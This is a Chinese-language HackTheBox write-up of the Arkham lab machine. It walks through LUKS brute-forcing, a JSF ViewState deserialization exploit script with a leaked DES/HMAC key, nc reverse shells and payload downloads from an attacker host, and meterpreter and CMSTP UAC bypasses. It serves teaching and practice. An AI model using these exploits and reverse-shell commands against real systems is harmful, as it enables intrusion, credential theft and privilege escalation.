Arkham是一个中等难度的靶机，但是它的难度可以和困难相媲美。知识点涉及lucks镜像、密码爆破、JSF
ViewState反序列化、ost邮件分析、CMSTP绕过UAC、GreatSCT绕过UAC等。感兴趣的同学可以在HackTheBox中进行学习。  
![截屏2021-12-15
下午2.38.20](https://image.3001.net/images/20220302/1646192114_621ee5f20c343170ab1cc.png!small)  
 _通关思维导图_  
![Bankrobber](https://image.3001.net/images/20220302/1646192116_621ee5f47787d570b054e.png!small)

## 0x01 侦查

### 端口探测

首先使用nmap进行端口扫描

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.130 -oA nmap_Arkham
    

![截屏2021-12-15
下午3.24.31](https://image.3001.net/images/20220302/1646192118_621ee5f63e596a021e967.png!small)  
扫描结果显示目标开放了80、135、139、445、8080端口

####  **80端口**

![截屏2021-12-15
下午3.26.00](https://image.3001.net/images/20220302/1646192120_621ee5f8a6ec482b1a862.png!small)
80端口为 IIS 默认界面，使用 gobuster 进行目录扫描

    
    
    gobuster dir -u http://10.10.10.130 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
    

![截屏2021-12-15
下午3.39.43](https://image.3001.net/images/20220302/1646192122_621ee5fab7dcb657d1e6a.png!small)

但是并没有扫描到什么有价值的目录

####  **8080端口**

![截屏2021-12-15
下午3.39.29](https://image.3001.net/images/20220302/1646192124_621ee5fcd256d908fb0b0.png!small)
页面显示这是一家名为 Mask 的公司，主要业务为数据保护。使用 gobuster 进行目录扫描

    
    
    gobuster dir -u http://10.10.10.130:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
    

![截屏2021-12-15
下午5.29.40](https://image.3001.net/images/20220302/1646192129_621ee601cb2ad607d0c4b.png!small)也没有发现什么有用的目录，查看网站可以在订阅中发现一个交互点  
![截屏2021-12-17
下午2.55.16](https://image.3001.net/images/20220302/1646192132_621ee6047567f88b4b30e.png!small)输入
mac 会给你一个返回信息  
![截屏2021-12-17
下午2.55.29](https://image.3001.net/images/20220302/1646192133_621ee605b3a7fe9f5aa6d.png!small)
**445端口**

使用 smbclient 查看当前共享

    
    
    smbclient -N -L //10.10.10.130
    

![截屏2021-12-17
下午4.45.06](https://image.3001.net/images/20220302/1646192134_621ee606d38a9ba1924f4.png!small)也可以使用
smbmap 进行扫描，但是获取到的信息并没有很多

    
    
    smbmap -H 10.10.10.130
    

![截屏2021-12-17
下午4.49.55](https://image.3001.net/images/20220302/1646192136_621ee608427c93d108eac.png!small)

**Users**  
查看 Users 共享

    
    
    smbclient //10.10.10.130/users
    

![截屏2021-12-17
下午4.53.07](https://image.3001.net/images/20220302/1646192139_621ee60b5a11808b6ff3c.png!small)

**BatShare**  
查看 BatShare 共享

    
    
    smbclient //10.10.10.130/batshare
    smb > get appserver.zip
    

![截屏2021-12-17
下午4.59.59](https://image.3001.net/images/20220302/1646192140_621ee60cd57f88b7a25db.png!small)  
通过对 Users 以及 BatShare 共享的探索我们发现 Users 中只存放了一些默认用户和访客用户的文件，而 BatShare
中包含了一个压缩包`appserver.zip`同时将其下载下来

### lucks映像

将下载下来的压缩包解压

    
    
    unzip appserver.zip
    

![截屏2021-12-17
下午5.04.47](https://image.3001.net/images/20220302/1646192142_621ee60e35342495165fb.png!small)  
其中包含一个文本和一个加密的磁盘映像

#### 爆破lucks密码

LUCKS 是 linux 硬盘加密的标准，如果我要访问里面的文件，必须先找到其中的密码。使用 bruteforce-luks 对密码进行爆破

    
    
    apt install bruteforce-luks
    cat /usr/share/wordlists/rockyou.txt | grep batman > test.txt
    bruteforce-luks -t 10 -f test.txt backup.img -v 60
    

![截屏2021-12-17
下午5.27.56](https://image.3001.net/images/20220302/1646192143_621ee60f89276b51c08e8.png!small)成功跑出密码为：batmanforver

#### 挂载磁盘映像

使用 cryptsetup 打开文件

    
    
    cryptsetup open --type luks backup.img arkham
    

查看驱动发现一个新设备

    
    
    ls -l /dev/mapper/
    

![截屏2021-12-17
下午5.39.13](https://image.3001.net/images/20220302/1646192144_621ee610b3aaee979ea6d.png!small)

挂载新设备到 Arkham 目录下

    
    
    mount /dev/mapper/arkham ~/hackthebox/Machines/Arkham/mnt/
    

![截屏2021-12-17
下午5.40.14](https://image.3001.net/images/20220302/1646192146_621ee61212566699ac6a5.png!small)

开始对目录中的文件进行枚举

    
    
    find ~/hackthebox/Machines/Arkham/mnt/ -type f
    

![截屏2021-12-17
下午5.54.55](https://image.3001.net/images/20220302/1646192148_621ee614302e075b81756.png!small)其中包括蝙蝠侠的图片和
tomcat-stuff 文件夹，通过对其中各个文件的筛查，我们在 web.xml.bak 中发现了有趣的东西  
![截屏2021-12-18
上午3.51.21](https://image.3001.net/images/20220302/1646192149_621ee615c070472a86cee.png!small)根据以上配置文件我们可以在发现如下信息

    
    
    该站点会匹配 *.faces 来调用 servlet
    myfaces 的 SECRET 为 SnNGOTg3Ni0=
    HmacSHA1 的 SECRET 为 SnNGOTg3Ni0=
    SnNGOTg3Ni0= 经过解码后为 JsF9876-    JSF 版本为 2.5.2
    

## 0x02 上线[Alfred]

### JSF ViewState反序列化漏洞

> JSF 框架主要使用序列化来保持站点的状态，它会帮助服务器序列化一个 Java
> 对象，并将其作为网页中的隐藏字段发送到客户端，当客户端提交时该序列化对象被发送回服务器，服务器可以使用它来取回状态。反序列化漏洞是允许用户提交序列化对象，如果序列化对象包含恶意代码，那么在反序列化过程中就会运行。从而用户可以控制输入来获取执行权限。

通过以上介绍和分析，我们可以推测该站点可能存在反序列化漏洞，那么如何来验证该漏洞呢？可采取以下思路

    
    
    1、测试提交错误的 ViewState 会发生什么？
    2、解密 ViewState 变量来显示我的加密密钥有效
    3、构建脚本加密好的 ViewState 并进行提交
    4、使用 ysoserial 来生成 payload，它可以使用脚本中的 ViewState 来 ping 主机
    5、更新 payload 获取反弹shell
    

找到之前的订阅栏目，使用 BurpSuite 将数据包拦截，具体数据包如下  
![截屏2021-12-18
下午5.46.27](https://image.3001.net/images/20220302/1646192151_621ee617e917d0f43e505.png!small)  
将 javax.faces.ViewState 参数的值的第一个字符从 w 字符修改为 W 字符，查看页面报错信息  
![截屏2021-12-18
下午5.36.32](https://image.3001.net/images/20220302/1646192153_621ee61905efdad172e8f.png!small)返回信息提示`No
Saved view state could be found for the view identifier`，这说明修改是有效的

### 探索ViewState

我们可以抓取到 javax.faces.ViewState 参数的值如下

    
    
    javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D
    

通过 python 代码来获取其中的字节流

    
    
    from base64 import b64decode
    from urllib.parse import unquote_plus as urldecode
    
    vs = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'
    vs_urldecode = urldecode(vs)
    print(vs_urldecode)
    vs_bs64decode = b64decode(vs_urldecode)
    print(vs_bs64decode)
    

![截屏2021-12-18
下午8.09.27](https://image.3001.net/images/20220302/1646192154_621ee61aac8f6eb82b8fc.png!small)

这是加密的字节流，我们需要通过解密来获取其中的信息。SHA1的长度通常为20字节，很可能附加到首位或末尾。经过测试 HMAC 存储在最后20字节中

    
    
    from base64 import b64decode
    from urllib.parse import unquote_plus as urldecode
    from hashlib import sha1
    import hmac
    
    vs = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'
    vs_urldecode = urldecode(vs)
    vs_bs64decode = b64decode(vs_urldecode)
    mac = vs_bs64decode[-20:]
    enc = vs_bs64decode[:-20]
    enc_hmac = hmac.new(b'JsF9876-', enc, sha1).digest()
    print(mac)
    print(enc_hmac)
    

![截屏2021-12-18
下午8.08.57](https://image.3001.net/images/20220302/1646192155_621ee61bb578a71c94dcf.png!small)目前已知加密方式、加密位置以及密钥，接下来就可以解密这串值

    
    
    from base64 import b64decode
    from urllib.parse import unquote_plus as urldecode
    from Crypto.Cipher import DES
    
    vs = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'
    vs_urldecode = urldecode(vs)
    vs_bs64decode = b64decode(vs_urldecode)
    enc = vs_bs64decode[:-20]
    d = DES.new(b'JsF9876-', DES.MODE_ECB)
    print(d.decrypt(enc))
    

![截屏2021-12-18
下午8.07.55](https://image.3001.net/images/20220302/1646192157_621ee61d0389918110a04.png!small)  
经过解密后出现字符串说明解密确实是正确的

使用 ysoserial 来生成 ping 命令的 payload

    
    
    java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar BeanShell1 'ping 10.10.14.14' > text
    

![截屏2021-12-18
下午9.17.34](https://image.3001.net/images/20220302/1646192158_621ee61e7273f3b6c90fb.png!small)生成成功，但是我需要将其放入
python 脚本当中进行调用

> 安装模块 pip install pycryptodome
    
    
    import requests
    import subprocess
    import sys
    from base64 import b64encode
    from Crypto.Cipher import DES
    from Crypto.Hash import SHA, HMAC
    from os import devnull
    from urllib.parse import quote_plus as urlencode
    
    
    with open(devnull, 'w') as null:
        payload = subprocess.check_output(['java', '-jar', '/root/hackthebox/Machines/Arkham/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar', sys.argv[1], sys.argv[2]], stderr=null)
    
    pad = (8 - (len(payload) % 8)) % 8
    padded = payload + (chr(pad)*pad).encode()
    
    d = DES.new(b'JsF9876-', DES.MODE_ECB)
    enc_payload = d.encrypt(padded)
    sig = HMAC.new(b'JsF9876-', enc_payload, SHA).digest()
    viewstate = b64encode(enc_payload + sig)
    
    sess = requests.session()
    sess.get('http://10.10.10.130:8080/userSubscribe.faces')
    resp = sess.post('http://10.10.10.130:8080/userSubscribe.faces',
            data = {'j_id_jsp_1623871077_1%3Aemail': 'd',
                    'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+UP',
                    'j_id_jsp_1623871077_1_SUBMIT': '1',
                    'javax.faces.ViewState': viewstate})
    

启动本地监听

    
    
    tcpdump -i tun0 icmp
    

使用脚本执行 ping 命令

    
    
    python3 exploit.py BeanShell1 'ping 10.10.14.14'
    

![截屏2021-12-20
上午3.14.34](https://image.3001.net/images/20220302/1646192160_621ee620cf53cd813504b.png!small)  
成功收到 ping 命令，反序列化漏洞验证成功

### 获取shell

为了获取目标站点的shell，我们把 nc64.exe 放在本目录下并开启 http 服务

    
    
    python -m SimpleHTTPServer 80
    

在本地开启监听，接收反弹shell

    
    
    rlwrap nc -nvlp 443
    

这里需要在 exploit.py 进行略微修改，源码如下

    
    
    #!/usr/bin/env python3
    
    import requests
    import subprocess
    import sys
    from base64 import b64encode
    from Crypto.Cipher import DES
    from Crypto.Hash import SHA, HMAC
    from os import devnull
    from urllib.parse import quote_plus as urlencode
    
    
    with open(devnull, 'w') as null:
        payload = subprocess.check_output(['java', '-jar', '/root/hackthebox/Machines/Arkham/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar', 'CommonsCollections5', sys.argv[1]], stderr=null)
    
    pad = (8 - (len(payload) % 8)) % 8
    padded = payload + (chr(pad)*pad).encode()
    
    d = DES.new(b'JsF9876-', DES.MODE_ECB)
    enc_payload = d.encrypt(padded)
    sig = HMAC.new(b'JsF9876-', enc_payload, SHA).digest()
    viewstate = b64encode(enc_payload + sig)
    
    sess = requests.session()
    sess.get('http://10.10.10.130:8080/userSubscribe.faces')
    resp = sess.post('http://10.10.10.130:8080/userSubscribe.faces',
            data = {'j_id_jsp_1623871077_1%3Aemail': 'd',
                    'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+UP',
                    'j_id_jsp_1623871077_1_SUBMIT': '1',
                    'javax.faces.ViewState': viewstate})
    

执行以下命令上传 nc 并使用 nc 连接本地443端口

    
    
    python3 exploit2.py "powershell -c Invoke-Webrequest -uri 'http://10.10.14.14/nc64.exe' -outfile \windows\system32\spool\drivers\color\nc.exe"
    python3 exploit2.py "\windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.14.14 443"
    

![截屏2021-12-20
上午3.29.02](https://image.3001.net/images/20220302/1646192162_621ee62238bc81972e7cc.png!small)成功收到反弹shell，在当前用户的桌面上找到第一个flag

    
    
    dir C:\Users\Alfred\Desktop
    type C:\Users\Alfred\Desktop\user.txt
    

![截屏2021-12-20
上午3.31.55](https://image.3001.net/images/20220302/1646192163_621ee6236e4d3f3e9b685.png!small)  
成功拿到第一个flag

## 0x03 权限提升[batman]

### 获得密码

在主目录下枚举关键文件

    
    
    dir /s /b /a:-d-h \Users\alfred | findstr /i /v "appdata"
    

![截屏2021-12-20
上午3.39.18](https://image.3001.net/images/20220302/1646192164_621ee624abf35a431d439.png!small)发现
backup.zip，我们需要将其下载到本地。借助 smbserver 来建立 smb 共享，同时设置账号密码，否则无法连接

    
    
    python3 smbserver.py -smb2support -username mac -password mac share /root/hackthebox/Machines/Arkham/
    

![截屏2021-12-20
上午3.44.54](https://image.3001.net/images/20220302/1646192166_621ee6260dc481e9a9017.png!small)在靶机上复制
backup.zip 到本机目录下

    
    
    net use \\10.10.14.14\share /u:mac mac
    copy C:\Users\Alfred\Downloads\backups\backup.zip \\10.10.14.14\share\
    

![截屏2021-12-20
上午3.47.59](https://image.3001.net/images/20220302/1646192167_621ee6277e43aee71146f.png!small)解压该文件，里面包含一个
ost 文件，是 Microsoft Outlook 的脱机文件夹文件

    
    
    unzip -l backup.zip
    

![截屏2021-12-20
上午3.54.09](https://image.3001.net/images/20220302/1646192169_621ee6294b7c1c1b7ec48.png!small)

借助 readpst 来进行解析，该工具可以用来解析`.pst`、`.ost`文件

    
    
    readpst alfred@arkham.local.ost
    

![截屏2021-12-20
上午3.56.41](https://image.3001.net/images/20220302/1646192170_621ee62a9c32a211c937f.png!small)解压完成是一个`.mbox`文件，这是一种电子邮件邮箱文件格式，可在单个文件中存储多条消息并将其作为文本。使用
mutt 来打开它

    
    
    mutt -R -f Drafts.mbox
    

![截屏2021-12-20
上午4.02.12](https://image.3001.net/images/20220302/1646192173_621ee62d7e771f29882de.png!small)这是一封给
batman 的邮件，翻到最后存在一个附件  
![截屏2021-12-20
上午4.04.16](https://image.3001.net/images/20220302/1646192176_621ee630ea1992d50ca1e.png!small)通过
v 来查看附件  
![截屏2021-12-20
上午4.04.44](https://image.3001.net/images/20220302/1646192179_621ee6333ff8c326d648c.png!small)  
![截屏2021-12-20
上午4.05.04](https://image.3001.net/images/20220302/1646192180_621ee6345a351957831ae.png!small)  
成功获取到账号密码为`batman/Zx^#QZX+T!123`

### 获取shell

进入 powershell 来制作凭据

    
    
    powershell
    $username = 'batman'
    $password = 'Zx^#QZX+T!123'
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
    

建立凭据后开启监听2222端口，之后执行命令以 batman 身份反弹shell

    
    
    Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.exe /c "C:\windows\system32\spool\drivers\color\nc.exe" -e cmd.exe 10.10.14.14 2222 }
    

![截屏2021-12-20
上午4.15.37](https://image.3001.net/images/20220302/1646192181_621ee635712e19bfc35c5.png!small)成功获得shell  
![截屏2021-12-20
上午4.15.45](https://image.3001.net/images/20220302/1646192183_621ee63764c9f7007cd8b.png!small)

## 0x04 UAC绕过

### 受限环境

查看当前用户权限

    
    
    net user batman
    

![截屏2021-12-20
上午4.19.40](https://image.3001.net/images/20220302/1646192185_621ee6392c258c9b6d425.png!small)  
该用户拥有管理员和远程管理员权限，但是读取 root.txt 时无法访问 administrator 的桌面

    
    
    dir c:\Users\administrator\Desktop
    type c:\Users\administrator\Desktop\root.txt
    

![截屏2021-12-20
上午4.22.16](https://image.3001.net/images/20220302/1646192187_621ee63b2ad52f8e95162.png!small)  
查询权限，判断当前环境为受限状态且 UAC 状态已经启用  
![截屏2021-12-20
上午4.26.03](https://image.3001.net/images/20220302/1646192188_621ee63c9e65aed0d60eb.png!small)

### 通过本地共享读取root.txt

    
    
    type \\localhost\c$\users\administrator\desktop\root.txt
    

![截屏2021-12-20
上午4.32.37](https://image.3001.net/images/20220302/1646192189_621ee63db04a7ef4334be.png!small)  
成功拿到第二个flag

### 借助msf绕过UAC读取root.txt

由于绕过大多数 UAC 都需要交互过程，使用 msf 能够有效帮助我们绕过 UAC

#### GreatSCT UAC绕过

借助 GreatSCT 来获取一个 meterpreter  
 **工具地址：https://github.com/GreatSCT/GreatSCT**

    
    
    cd setup
    ./setup.sh
    

![截屏2021-12-20
上午4.55.30](https://image.3001.net/images/20220302/1646192190_621ee63ec039f9bbd7c93.png!small)建立完成后，使用
GreatSCT.py 查看相关命令

    
    
    python3 GreatSCT.py
    

使用 bypass

    
    
    use bypass
    

![截屏2021-12-20
上午5.13.16](https://image.3001.net/images/20220302/1646192193_621ee6416319cf32c3627.png!small)查看反弹脚本

    
    
    list
    

![截屏2021-12-20
上午5.14.19](https://image.3001.net/images/20220302/1646192194_621ee642c778d8f545a99.png!small)使用`msbuild/meterpreter/rev_tcp.py`设置
tcp 监听

    
    
    use msbuild/meterpreter/rev_tcp.py
    

![截屏2021-12-20
上午5.15.13](https://image.3001.net/images/20220302/1646192196_621ee644a6f54843412da.png!small)

设置本地IP和端口

    
    
    set LHOST 10.10.14.14
    set LPORT 4444
    

![截屏2021-12-20
上午5.16.17](https://image.3001.net/images/20220302/1646192200_621ee6484117570ec5e05.png!small)

    
    
    generate
    ##输入arkham
    

![截屏2021-12-20
上午5.18.39](https://image.3001.net/images/20220302/1646192202_621ee64ab0704c5122428.png!small)成功生成
arkham.xml 、arkham.rc，这两个文件有不同的作用。arkham.xml 用于在 windows 中反弹
meterpreter，arkham.rc 用于在 msf 中直接配置监听  
![截屏2021-12-20
上午5.19.05](https://image.3001.net/images/20220302/1646192204_621ee64c3e2f632fdc56a.png!small)

使用 msfconsole 加载 rc 文件并设置参数

    
    
    msfconsole -r arkham.rc
    

![截屏2021-12-20
上午5.21.19](https://image.3001.net/images/20220302/1646192206_621ee64e19c5a6c3def52.png!small)

与此同时将 xml 文件移动到目标靶机上

    
    
    cd \Users\Batman\appdata\local\temp\
    net use \\10.10.14.14\share /u:mac mac
    copy \\10.10.14.14\share\arkham.xml C:\Users\Batman\appdata\local\temp\
    

![截屏2021-12-20
上午5.24.19](https://image.3001.net/images/20220302/1646192208_621ee6505675da9db4f6f.png!small)

运行 msbuild 获取 meterpreter 会话

    
    
    \Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \Users\Batman\appdata\local\temp\arkham.xml
    

![截屏2021-12-20
上午5.25.05](https://image.3001.net/images/20220302/1646192209_621ee6519523626596f79.png!small)在
msf 中成功返回会话  
![截屏2021-12-20
上午5.26.22](https://image.3001.net/images/20220302/1646192210_621ee652e7908c911fe49.png!small)

#### CMSTP UAC绕过

 **参考文章：https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html**  
查看交互进程`explore.exe`，并将当前进程迁移到对应的进程号中

    
    
    ps -S explore
    migrate 4824
    

![截屏2021-12-20
上午5.32.51](https://image.3001.net/images/20220302/1646192212_621ee6547a7c77e3cb588.png!small)将上面的
C-Sharp 源码命名为 Source.cs，通过 powershell 编译为 dll 文件

    
    
    load powershell
    powershell_shell
    cd \Users\Batman\appdata\local\temp\
    iwr -uri 10.10.14.14/Source.cs -outfile Source.cs
    Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
    

![截屏2021-12-20
上午5.37.52](https://image.3001.net/images/20220302/1646192213_621ee655f0749bb1e264c.png!small)将该
dll 加载到内存中

    
    
    [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
    

在本地开启 nc 监听，可以调用导出的函数执行反弹shell

    
    
    [CMSTPBypass]::Execute("C:\windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.14 7777")
    

![截屏2021-12-20
上午5.41.02](https://image.3001.net/images/20220302/1646192215_621ee6578a2a555104c17.png!small)

在本地获取到反弹shell  
![截屏2021-12-20
上午5.42.30](https://image.3001.net/images/20220302/1646192216_621ee658d25891617f1be.png!small)

查看权限以及对应flag

    
    
    whoami /priv
    

![截屏2021-12-20
上午5.42.49](https://image.3001.net/images/20220302/1646192218_621ee65a6c1837d809265.png!small)

    
    
    dir c:\Users\administrator\Desktop
    type c:\Users\administrator\Desktop\root.txt
    

![截屏2021-12-20上午5.43.06](https://image.3001.net/images/20220302/1646192221_621ee65d0fa5c8c388eda.png!small)

## **总结**

smb匿名登陆后发现lucks镜像，成功爆破lucks密码后挂载该镜像，在其中查看相关配置信息。站点中存在JSF
ViewState反序列化漏洞，虽然数据是加密的，但是它提供了一个用于执行攻击的密钥从而能够成功获取用户权限，在靶机中发现zip压缩文件，解压后是一个mbox文件，打开该邮件后发现其中存储了管理员的账号密码，通过该账号密码借助powershell上线，成功获取管理员权限，但是其中存在UAC限制，最终可使用msf或本地共享绕过UAC拿到flag。

